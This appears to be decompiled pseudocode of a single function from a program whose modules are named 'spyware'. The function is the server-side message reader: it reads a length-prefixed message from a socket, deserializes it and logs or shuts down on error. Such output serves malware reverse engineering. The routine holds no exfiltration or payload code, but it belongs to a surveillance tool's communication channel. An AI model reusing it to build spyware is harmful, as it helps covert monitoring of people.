
  fn spyware::communication::server::get_message::hbc00a55f19d841bb(arg1: *mut i64, arg2: *mut i32) -> *mut *mut c_void

{
    let mut var_110: *mut i32 = arg2;
    let mut var_114: i32 = 0;
    let result_2: *mut *mut c_void =
        std::io::default_read_exact::h211f5ece7b69528c(&var_110, &var_114, 4);
    let mut var_100: i16;
    let var_f8: i64;
    let var_f0: u64;
    let mut var_98: *mut *mut c_void;
    
    if result_2 == 0
    {
        _$LT$u8$u20$as$u20$alloc..vec..spec_from_elem..SpecFromElem$GT$::from_elem::h7bf4e21cb06e4eac(&var_100, 
            spyware::communication::serialization::extract_msg_type_and_length::h40fb0f3bb65520f5(
                var_114));
        core::result::Result$LT$T$C$E$GT$::expect::h34ced1219d91af61(
            std::io::default_read_exact::h211f5ece7b69528c(&var_110, var_f8, var_f0));
        ron::de::from_bytes::ha5c92b24cfa261b6(&var_98);
        let mut var_58: i128;
        core::result::Result$LT$T$C$E$GT$::unwrap::h4c1d4d68a5062f9a(&var_58, &var_98);
        let zmm0_2: i128 = var_58;
        let var_28: i128;
        *arg1.byte_offset(0x30) = var_28;
        let var_38: i128;
        *arg1.byte_offset(0x20) = var_38;
        let var_48: i128;
        *arg1.byte_offset(0x10) = var_48;
        *arg1 = zmm0_2;
        return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h5aa1feab37440eed(
            &var_100);
    }
    
    let mut result_1: *mut *mut c_void = result_2;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() == 0
    {
        goto 'label_44ccb2;
    }
    
    std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_100, var_110);
    let rax_1: i16 = var_100;
    let mut rax_2: i64;
    
    if rax_1 != 2
    {
        let var_fa: i16;
        let var_d2_1: i16 = var_fa;
        let var_fe: i32;
        let var_d6_1: i32 = var_fe;
        let zmm0_1: i128 = var_f0;
        let var_18_1: i128 = zmm0_1;
        let mut var_d8: i16 = rax_1;
        let var_d0_1: i64 = var_f8;
        let var_c8_1: i128 = zmm0_1;
        let mut var_b8: *mut i16 = &var_d8;
        let var_b0_1: fn(arg1: *mut i8) -> i64 = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::hb8f0b665671134da;
        let var_a8_1: *mut *mut *mut c_void = &result_1;
        let var_a0_1: fn(arg1: *mut i64, arg2: *mut i64) -> i64 =
            _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
        var_98 = &data_4b8bb0;
        let var_90_1: i64 = 2;
        let var_78_1: i64 = 0;
        let var_88_1: *mut *mut i16 = &var_b8;
        let var_80_1: i64 = 2;
        let rax_6: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8c18);
        var_100 = "spyware::communication::serverUn…";
        let var_f8_1: i64 = 0x1e;
        let var_f0_1: *const i8 = "spyware::communication::serverUn…";
        let var_e8_1: i64 = 0x1e;
        let var_e0_1: i64 = rax_6;
        log::__private_api::log::h13afddf373bd7d7f(&var_98, 1, &var_100);
        'label_44ccb2:
        rax_2 = std::os::unix::net::stream::UnixStream::shutdown::h18b658800364aeec(var_110, 2);
        
        if rax_2 == 0
        {
            let result: *mut *mut c_void = result_1;
            arg1[1] = result;
            *arg1 = -0x7ffffffffffffff6;
            return result;
        }
    }
    else
    {
        rax_2 = var_f8;
    }
    
    arg1[1] = rax_2;
    *arg1 = -0x7ffffffffffffff6;
    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&result_1)
}
